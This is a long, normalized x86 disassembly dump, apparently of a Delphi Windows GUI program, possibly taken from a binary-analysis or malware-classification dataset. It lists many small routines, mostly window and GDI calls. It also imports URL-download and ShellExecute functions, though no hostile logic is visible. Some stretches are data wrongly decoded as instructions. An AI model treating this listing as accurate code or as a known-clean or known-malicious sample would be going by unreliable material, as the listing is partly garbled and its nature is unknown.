sub_3a897a0
jmp sub_3a64b54
sub_3a89815
jmp sub_3a64b54
sub_3a8981c
pop ebx
pop ecx
pop ebp
retn
sub_3a89820
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x14 ]
retn
sub_3a898de
jmp sub_3a64b54
sub_3a89904
mov eax [ eax + 0x10 ]
movzx eax [ eax + 0x1c ]
retn
sub_3a8993c
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x18 ]
retn
sub_3a89a53
jmp sub_3a64b54
sub_3a89a5a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a88da8
retn
sub_3a89a70
jmp sub_3a64b54
sub_3a89ae9
jmp sub_3a64b54
sub_3a89af0
pop ebx
pop ecx
pop ebp
retn
sub_3a89c42
jmp sub_3a64b54
sub_3a89c54
mov eax [ eax + 0x10 ]
movzx eax [ eax + 0x1c ]
retn
sub_3a89f78
push ebx
mov ebx eax
push rw-data
call EnterCriticalSection
inc [ ebx + 0x50 ]
push rw-data
call LeaveCriticalSection
lea eax [ ebx + 0x38 ]
push eax
call EnterCriticalSection
pop ebx
retn
sub_3a8a224
jmp sub_3a64b54
sub_3a8a22b
movzx eax [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
retn
sub_3a8a234
push ebx
mov ebx eax
lea eax [ ebx + 0x38 ]
push eax
call LeaveCriticalSection
push rw-data
call EnterCriticalSection
dec [ ebx + 0x50 ]
push rw-data
call LeaveCriticalSection
pop ebx
retn
sub_3a8a26c
mov eax [ eax + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_3a8a3c4
retn
sub_3a8a491
add [ eax ] al
add [ ebx + 0x66 ] dl
cmp [ eax + 0x32 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
sub_3a8a4a8
push ebx
cmp [ eax + 0x2a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_3a8a594
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x2
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xfd
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_3a8a5b4
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x4
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xfb
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_3a8a5d4
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x8
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xf7
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_3a8a5f4
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d3d4
call sub_3a64c34
pop ebx
retn
sub_3a8a60c
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d3d4
call sub_3a64c34
pop ebx
retn
sub_3a8a630
mov eax [ rw-data ]
call sub_3a8a60c
retn
sub_3a8a692
jmp sub_3a64b54
sub_3a8a699
pop ecx
pop ebp
retn
sub_3a8a738
jmp sub_3a64b54
sub_3a8a73f
pop ebx
mov esp ebp
pop ebp
retn
sub_3a8a811
jmp sub_3a64b54
sub_3a8a8a2
jmp sub_3a64b54
sub_3a8a8a9
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a8a9bc
jmp sub_3a64b54
sub_3a8ab69
jmp sub_3a64b54
sub_3a8ab70
movzx eax [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x28
sub_3a8ad89
jmp sub_3a64b54
sub_3a8ad90
lea eax [ ebp - 0x408 ]
push eax
call CreatePalette
pop ebx
mov esp ebp
pop ebp
retn
sub_3a8ae2a
jmp sub_3a64b54
sub_3a8b007
jmp sub_3a64b54
sub_3a8b0c1
jmp sub_3a64b54
sub_3a8b0c8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a8b0e8
mov eax [ ebp - 0x10 ]
push eax
push 0x0
call ReleaseDC
retn
sub_3a8b0e1
jmp sub_3a64b54
sub_3a8b0e8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_3a8b279
jmp sub_3a64b54
sub_3a8b446
jmp sub_3a64b54
sub_3a8b44d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a8b470
mov eax [ ebp - 0x40 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x2c ]
call sub_3a62efc
retn
sub_3a8b469
jmp sub_3a64b54
sub_3a8b470
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a8b490
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
call sub_3a62efc
retn
sub_3a8b489
jmp sub_3a64b54
sub_3a8b490
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_3a8b49c
xor ecx ecx
mov edx eax
add eax 0x14
jmp r-xdata
cmp edx eax
jl r-xdata
xor cx [ edx ]
add edx 0x2
mov eax ecx
retn
sub_3a8b600
push 0x0
call sub_3a8b598
retn
sub_3a8b6a5
jmp sub_3a64b54
sub_3a8b6ac
movzx eax [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_3a8b6bc
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
push 0x0
call sub_3a8b608
pop ebx
pop ebp
retn 0x4
sub_3a8b6d0
retn
sub_3a8b6d4
test eax eax
jne r-xdata
retn
call sub_3a8b6d0
sub_3a8b8a9
jmp sub_3a64b54
sub_3a8b8d0
jmp sub_3a64b54
sub_3a8b8d7
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a8b918
push ebx
mov [ eax + 0x20 ] 0x1
cmp [ eax + 0x12 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x14 ]
call [ ebx + 0x10 ]
sub_3a8bae5
mov eax [ ebp - 0xc ]
call sub_3a64380
retn
sub_3a8baee
jmp sub_3a64b54
j_sub_3a8bae5
jmp sub_3a8bae5
sub_3a8baf5
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_3a64380
retn
sub_3a8bb0b
jmp sub_3a64b54
sub_3a8bb20
xor eax eax
retn
sub_3a8bb24
movzx eax [ eax + 0x21 ]
retn
sub_3a8bb74
jmp sub_3a64b54
sub_3a8bb7b
pop esi
pop ecx
pop ebp
retn
sub_3a8bbac
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
pop esi
retn
sub_3a8bc03
jmp sub_3a64b54
sub_3a8bc0a
pop esi
pop ecx
pop ebp
retn
sub_3a8bc10
retn
sub_3a8bc30
cmp dl [ eax + 0x21 ]
je r-xdata
retn
mov [ eax + 0x21 ] dl
mov edx eax
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_3a8bc40
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x58 ]
pop esi
retn
sub_3a8bdc5
jmp sub_3a64b54
sub_3a8bdcc
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3a8beeb
jmp sub_3a64b54
sub_3a8bef2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_3a8bf7a
jmp sub_3a64b54
sub_3a8bf81
mov eax esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a8c0dc
jmp sub_3a648a0
sub_3a8c100
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a8bce8
mov [ rw-data ] eax
sub_3a8c120
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a8bfec
mov [ rw-data ] eax
sub_3a8c2f0
jmp sub_3a648a0
sub_3a8c474
jmp sub_3a648a0
sub_3a8c4f2
jmp sub_3a64b54
sub_3a8c4f9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a8c68c
retn
sub_3a8c82c
cmp [ eax + 0x28 ] 0x0
sete al
retn
sub_3a8cb30
jmp sub_3a64b54
sub_3a8cb37
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a8ccaf
jmp sub_3a64b54
sub_3a8ccb6
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a8cd47
jmp sub_3a64b54
sub_3a8cd4e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a8cd70
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_3a652c4
retn
sub_3a8cd69
jmp sub_3a64b54
sub_3a8cd70
pop ebx
mov esp ebp
pop ebp
retn
sub_3a8cd85
add [ eax ] al
add [ ebx + 0x74002878 ] al
adc al [ eax + 0x74002c78 ]
pop es
call sub_3a8d06c
jmp r-xdata
retn
sub_3a8cd9b
call sub_3a8d0f8
retn
sub_3a8ce90
retn
sub_3a8d0e8
jmp sub_3a64b54
sub_3a8d213
jmp sub_3a64b54
sub_3a8d21a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
push 0x0
call ReleaseDC
retn
sub_3a8d233
jmp sub_3a64b54
sub_3a8d4b6
jmp sub_3a64b54
sub_3a8d4de
jmp sub_3a64b54
sub_3a8d4e5
mov esp ebp
pop ebp
retn
sub_3a8d55c
jmp sub_3a64b54
sub_3a8d664
jmp sub_3a64b54
sub_3a8d74f
jmp sub_3a64b54
sub_3a8d75c
inc [ eax + 0x4 ]
retn
sub_3a8d8d7
jmp sub_3a64b54
sub_3a8dc88
jmp sub_3a64b54
sub_3a8ded2
jmp sub_3a64b54
sub_3a8defc
jmp sub_3a64b54
sub_3a8df03
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a8df25
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
retn
sub_3a8df1e
jmp sub_3a64b54
sub_3a8df2f
jmp sub_3a648a0
sub_3a8df7e
jmp sub_3a64b54
sub_3a8e1ab
jmp sub_3a64b54
sub_3a8e1f3
jmp sub_3a64b54
sub_3a8e36a
jmp sub_3a64b54
sub_3a8e434
jmp sub_3a648a0
sub_3a8e488
mov [ eax + 0x31 ] 0x0
call sub_3a8b918
retn
sub_3a8e6db
jmp sub_3a64b54
sub_3a8e746
jmp sub_3a64b54
sub_3a8e74d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a8e7bc
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp [ eax + 0x6c ] 0x0
je r-xdata
mov al 0x1
retn
sub_3a8e870
mov ecx eax
mov eax [ ecx + 0x28 ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
retn
sub_3a8e880
push ebx
mov ebx eax
mov eax ebx
call sub_3a8eabc
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0xc ]
pop ebx
retn
sub_3a8e894
mov eax [ eax + 0x28 ]
add eax 0x18
cmp [ eax + 0x10 ] 0x1
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x12 ] 0x1
je r-xdata
mov al 0x1
retn
sub_3a8e8b0
push ebx
mov ebx eax
mov eax ebx
call sub_3a8eb1c
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
pop ebx
retn
sub_3a8e990
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x1c ]
retn
sub_3a8ea9f
jmp sub_3a64b54
sub_3a8ed04
jmp sub_3a648a0
sub_3a8ed64
jmp sub_3a64b54
sub_3a8ed6b
mov eax [ ebp - 0x4 ]
mov [ eax + 0x32 ] 0x0
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
sub_3a8f14f
jmp sub_3a64b54
sub_3a8f17b
jmp sub_3a64b54
sub_3a8f1e2
jmp sub_3a648a0
sub_3a8f213
jmp sub_3a64b54
sub_3a8f298
jmp sub_3a648a0
sub_3a8f29d
mov eax [ ebp - 0x38 ]
call sub_3a64380
call sub_3a64c5c
call sub_3a64cb0
sub_3a8f2af
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a8f2cc
mov eax [ ebp - 0x18 ]
call sub_3a62efc
retn
sub_3a8f2c5
jmp sub_3a64b54
sub_3a8f41f
jmp sub_3a648a0
sub_3a8f6b4
jmp sub_3a648a0
sub_3a8f83c
jmp sub_3a64b54
sub_3a8f874
mov cl 0x1
call sub_3a8f87c
retn
sub_3a8fb31
add [ eax ] al
add [ ebx ] dh
leave
call sub_3a8f87c
retn
sub_3a8fbb6
jmp sub_3a648a0
sub_3a8fbbb
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
push eax
call DeleteObject
call sub_3a64c5c
call sub_3a64cb0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_3a8fc70
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
pop ebx
retn
push eax
call DestroyIcon
sub_3a8fdad
add [ eax ] al
add [ ebx + 0x78832840 ] cl
or [ eax ] al
jne r-xdata
xor eax eax
retn
cmp [ eax + 0xc ] 0x0
je r-xdata
mov al 0x1
retn
sub_3a8fddc
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x14 ]
test eax eax
jne r-xdata
retn
push 0xc
call GetSystemMetrics
sub_3a8fdf0
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x10 ]
test eax eax
jne r-xdata
retn
push 0xb
call GetSystemMetrics
sub_3a8ff09
jmp sub_3a648a0
sub_3a8ffbe
jmp sub_3a648a0
sub_3a90028
jmp sub_3a648a0
sub_3a90115
jmp sub_3a64b54
sub_3a9012c
mov ecx [ eax + 0x28 ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_3a8a5f4
retn
mov [ eax + 0x30 ] edx
retn
sub_3a90144
push ebx
mov ebx [ eax + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_3a8a5f4
pop ebx
retn
mov [ eax + 0x2c ] edx
mov [ eax + 0x30 ] ecx
pop ebx
retn
sub_3a90164
retn
sub_3a90168
mov ecx [ eax + 0x28 ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_3a8a5f4
retn
mov [ eax + 0x2c ] edx
retn
sub_3a901a8
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_3a8a5f4
pop ebp
retn 0x4
sub_3a901bc
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_3a8a5f4
pop ebp
retn 0x4
sub_3a90215
jmp sub_3a64b54
sub_3a9021c
mov eax rw-data
mov edx 0xf
call sub_3a8ac8c
mov [ rw-data ] eax
pop ecx
pop ebp
retn
sub_3a90333
jmp sub_3a64b54
sub_3a9037b
jmp sub_3a64b54
sub_3a90382
mov esp ebp
pop ebp
retn
sub_3a904b8
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_3a904c4
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_3a90571
jmp sub_3a64b54
sub_3a90578
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_3a90663
jmp sub_3a648a0
sub_3a906d1
jmp sub_3a64b54
sub_3a90805
jmp sub_3a64b54
sub_3a9080c
pop ebp
retn
sub_3a90c44
retn
sub_3a90c48
retn
sub_3a90df4
mov eax [ eax + 0x4 ]
push eax
call SetEvent
retn
sub_3a90e00
mov eax [ eax + 0x4 ]
push eax
call ResetEvent
retn
sub_3a90e7c
add eax 0x4
push eax
call EnterCriticalSection
retn
sub_3a90e88
add eax 0x4
push eax
call LeaveCriticalSection
retn
sub_3a90e94
mov edx [ eax ]
call [ edx ]
retn
sub_3a90e9c
mov edx [ eax ]
call [ edx + 0x4 ]
retn
sub_3a91277
jmp sub_3a64b54
sub_3a9127e
pop ebp
retn
sub_3a91633
jmp sub_3a64b54
sub_3a9163a
movzx eax [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
retn
sub_3a91a54
jmp sub_3a64b54
sub_3a91a5b
pop ebp
retn
sub_3a91beb
jmp sub_3a64b54
sub_3a91bf2
pop ebp
retn
InternetCloseHandle
jmp [ InternetCloseHandle@IAT ]
InternetOpenA
jmp [ InternetOpenA@IAT ]
InternetOpenUrlA
jmp [ InternetOpenUrlA@IAT ]
InternetReadFile
jmp [ InternetReadFile@IAT ]
ShellExecuteA
jmp [ ShellExecuteA@IAT ]
sub_3a91ca4
outsd

sub_3a9429c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
sub_3a95590
mov dl 0x1
test eax eax
je r-xdata
xor edx edx
cmp [ eax + 0x80 ] 0x0
jne r-xdata
mov eax edx
retn
mov eax [ eax + 0x30 ]
test eax eax
jne r-xdata
sub_3a95748
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_3aafb88
pop esi
pop ebx
retn
sub_3a95844
jmp sub_3a64b54
sub_3a9584b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_3a95bfd
jmp sub_3a64b54
sub_3a95c04
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a95cab
jmp sub_3a64b54
sub_3a95cb2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a95e3c
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_3ab2324
mov eax ebx
mov si 0xffc6
call sub_3a6457c
pop esi
pop ebx
retn
sub_3a95f06
jmp sub_3a64b54
sub_3a95f6c
push esi
mov esi eax
cmp dl [ esi + 0x19c ]
je r-xdata
pop esi
retn
mov [ esi + 0x19c ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
sub_3a95f8c
push esi
mov esi eax
cmp dl [ esi + 0x1a2 ]
je r-xdata
pop esi
retn
mov [ esi + 0x1a2 ] dl
mov [ esi + 0x19d ] 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
sub_3a95fb0
push esi
cmp dl [ eax + 0x19d ]
je r-xdata
pop esi
retn
mov [ eax + 0x19d ] dl
mov [ eax + 0x1a2 ] 0x0
mov si 0xffc6
call sub_3a6457c
sub_3a95fd4
test [ eax + 0x50 ] 0x40
setne al
xor al 0x1
retn
sub_3a95fe0
mov [ eax + 0x198 ] edx
test edx edx
je r-xdata
retn
xchg edx eax
call sub_3a83738
sub_3a95ff4
push esi
mov esi eax
cmp dl [ esi + 0x1a0 ]
je r-xdata
pop esi
retn
mov [ esi + 0x1a0 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
sub_3a9605c
push esi
mov esi eax
cmp dl [ esi + 0x19e ]
je r-xdata
pop esi
retn
mov [ esi + 0x19e ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
sub_3a960d8
push ebx
push esi
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
mov eax ebx
mov si 0xffc6
call sub_3a6457c
pop esi
pop ebx
retn
sub_3a960f4
push esi
mov esi eax
mov eax esi
call sub_3ab1d68
mov eax esi
mov si 0xffc6
call sub_3a6457c
pop esi
retn
sub_3a96199
jmp sub_3a64b54
sub_3a961a0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3a96284
cmp dl [ eax + 0x257 ]
je r-xdata
retn
mov [ eax + 0x257 ] dl
call sub_3a968f0
sub_3a96298
push ebx
mov ebx eax
cmp dl [ ebx + 0x254 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x254 ] dl
mov eax ebx
call sub_3a968f0
mov eax ebx
call sub_3ab4518
sub_3a962bc
cmp dl [ eax + 0x25b ]
je r-xdata
retn
mov [ eax + 0x25b ] dl
call sub_3ab4518
sub_3a962d0
cmp dl [ eax + 0x259 ]
je r-xdata
retn
mov [ eax + 0x259 ] dl
call sub_3ab4518
sub_3a96314
cmp dl [ eax + 0x25a ]
je r-xdata
retn
mov [ eax + 0x25a ] dl
call sub_3ab4518
sub_3a96414
jmp sub_3a64b54
sub_3a9641b
pop ebx
pop ecx
pop ebp
retn
sub_3a96534
push ebx
mov ebx eax
push r-xdata
mov eax ebx
call sub_3ab7c38
push eax
call SetWindowTextA
pop ebx
retn
sub_3a96550
push ebx
mov ebx eax
push 0xffffffff
push 0x0
push 0xb1
mov eax ebx
call sub_3ab7c38
push eax
call __imp_SendMessageA
pop ebx
retn
sub_3a965f6
jmp sub_3a64b54
sub_3a965fd
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a96696
jmp sub_3a64b54
sub_3a9680b
jmp sub_3a64b54
sub_3a969a2
jmp sub_3a64b54
sub_3a96a10
push ebx
mov ebx eax
mov eax ebx
call sub_3aaf788
cmp [ ebx + 0x262 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x264 ]
call [ ebx + 0x260 ]
sub_3a96aab
jmp sub_3a64b54
sub_3a96ab2
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_3a96c15
jmp sub_3a64b54
sub_3a96cc8
push esi
cmp [ edx + 0x6 ] 0x300
jne r-xdata
pop esi
retn
cmp [ eax + 0x25c ] 0x0
jne r-xdata
mov si 0xffb0
call sub_3a6457c
sub_3a96f8b
jmp sub_3a64b54
sub_3a96f92
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_3a9703c
push esi
mov esi eax
mov eax [ esi + 0x18 ]
mov edx [ eax ]
call [ edx + 0xf0 ]
pop esi
retn
sub_3a9709c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_3aafb88
pop esi
pop ebx
retn
sub_3a97184
jmp sub_3a64b54
sub_3a9718b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a97420
movzx eax [ eax + 0x274 ]
retn
sub_3a97428
push ebx
mov ebx eax
mov eax ebx
call sub_3ab2324
xor edx edx
mov eax ebx
call sub_3a96360
pop ebx
retn
sub_3a97440
cmp dl [ eax + 0x274 ]
je r-xdata
retn
mov [ eax + 0x274 ] dl
call sub_3ab4518
sub_3a97454
push esi
mov esi eax
mov eax [ esi + 0x270 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_3a97464
cmp dl [ eax + 0x275 ]
je r-xdata
retn
mov [ eax + 0x275 ] dl
call sub_3ab4518
sub_3a97478
cmp dl [ eax + 0x276 ]
je r-xdata
retn
mov [ eax + 0x276 ] dl
call sub_3ab4518
sub_3a974c0
call sub_3ab6e90
retn
sub_3a974ec
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x146
mov eax [ ebx + 0x18 ]
call sub_3ab7c38
push eax
call __imp_SendMessageA
pop ebx
retn
sub_3a97588
jmp sub_3a64b54
sub_3a9758f
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3a9767c
jmp sub_3a64b54
sub_3a97683
pop ebx
pop ecx
pop ebp
retn
sub_3a97858
push ebx
mov ebx eax
mov edx r-xdata
mov eax ebx
call sub_3aafb64
mov eax [ ebx + 0x284 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov [ ebx + 0x2a8 ] 0xffffffff
pop ebx
retn
sub_3a978a8
push ebx
mov ebx eax
push 0xffff0000
push 0x0
push 0x142
mov eax ebx
call sub_3ab7c38
push eax
call __imp_SendMessageA
pop ebx
retn
sub_3a979d8
test edx edx
jle r-xdata
retn
mov [ eax + 0x280 ] edx
call sub_3ab4518
sub_3a97a0c
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_3a97a14
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_3a97a1c
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_3a97a48
cmp eax [ edx + 0x8 ]
je r-xdata
retn
push 0x0
xor ecx ecx
mov edx 0x14f
call sub_3ab0e78
sub_3a97af8
jmp sub_3a64b54
sub_3a97aff
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_3a97d06
jmp sub_3a64b54
sub_3a97d14
push ebx
push esi
mov esi eax
mov eax [ esi + 0x2a0 ]
push eax
mov ecx [ esi + 0x28c ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x104 ]
pop esi
pop ebx
retn
sub_3a97fed
jmp sub_3a648a0
sub_3a97ff2
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_3acf68c
call sub_3a64cb0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_3a98314
jmp sub_3a64b54
sub_3a9831b
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3a98324
push ebx
mov ebx eax
mov eax ebx
call sub_3aaf788
cmp [ ebx + 0x262 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x264 ]
call [ ebx + 0x260 ]
sub_3a98348
push ebx
cmp [ eax + 0x272 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x274 ]
call [ ebx + 0x270 ]
sub_3a983d0
push ebx
cmp [ eax + 0x27a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x27c ]
call [ ebx + 0x278 ]
sub_3a98526
jmp sub_3a64b54
sub_3a98570
or edx 0xffffffff
mov ecx [ eax ]
call [ ecx + 0xe0 ]
retn
sub_3a985fb
jmp sub_3a64b54
sub_3a98602
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3a98634
mov edx [ eax ]
call [ edx + 0x118 ]
retn
sub_3a986e5
jmp sub_3a64b54
sub_3a986ec
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3a987a6
jmp sub_3a64b54
sub_3a98854
mov eax [ r-xdata ]
retn
sub_3a9885c
xor eax eax
retn
sub_3a98880
retn
sub_3a989b0
cmp dl [ eax + 0x251 ]
je r-xdata
retn
mov [ eax + 0x251 ] dl
call sub_3ab4518
sub_3a98a50
xor eax eax
retn
sub_3a98b1b
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x4cc9173d ]
add [ eax ] eax
movzx eax [ ebx + 0x258 ]
mov [ ebx + 0x25a ] al
pop ebx
retn
sub_3a98b38
push esi
cmp [ edx + 0x6 ] 0x0
jne r-xdata
pop esi
retn
mov si 0xffeb
call sub_3a6457c
sub_3a98c29
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
sub_3a98c32
jmp sub_3a64b54
j_sub_3a98c29
jmp sub_3a98c29
sub_3a98c39
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3a98dfc
push ebx
mov ebx eax
mov eax ebx
call sub_3aaf788
mov eax ebx
call sub_3ab16b0
pop ebx
retn
sub_3a98e10
cmp [ eax + 0x25a ] 0x1
sete al
retn
sub_3a98e1c
cmp dl [ eax + 0x258 ]
je r-xdata
retn
mov [ eax + 0x258 ] dl
call sub_3ab4518
sub_3a98e30
test dl dl
je r-xdata
xor edx edx
call sub_3a98e44
retn
mov dl 0x1
call sub_3a98e44
retn
sub_3a98f14
push esi
mov esi eax
mov eax esi
call sub_3ab608c
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
pop esi
retn
sub_3a98f2c
call sub_3ab4518
retn
sub_3a98fc2
jmp sub_3a64b54
sub_3a98fc9
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3a98fd0
cmp [ edx + 0x6 ] 0x0
jne r-xdata
retn
mov edx [ eax ]
call [ edx + 0xe0 ]
sub_3a99011
jmp sub_3a64b54
sub_3a99018
pop ebp
retn
GetOpenFileNameA
jmp [ GetOpenFileNameA@IAT ]
GetSaveFileNameA
jmp [ GetSaveFileNameA@IAT ]
sub_3a99e91
jmp sub_3a64b54
sub_3a99e98
pop ebp
retn
sub_3a9a768
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
sub_3a9b865
jmp sub_3a64b54
sub_3a9b86c
pop ebx
mov esp ebp
pop ebp
retn
sub_3a9b992
jmp sub_3a64b54
sub_3a9b999
pop ebx
mov esp ebp
pop ebp
retn
sub_3a9baa8
cmp dl [ eax + 0x1a9 ]
je r-xdata
retn
mov [ eax + 0x1a9 ] dl
mov edx eax
call sub_3a9bb18
sub_3a9bac0
push esi
mov esi eax
mov eax [ esi + 0x198 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_3a9bad0
cmp dl [ eax + 0x1a8 ]
je r-xdata
retn
mov [ eax + 0x1a8 ] dl
mov edx eax
call sub_3a9bb18
sub_3a9bae8
cmp dl [ eax + 0x1ab ]
je r-xdata
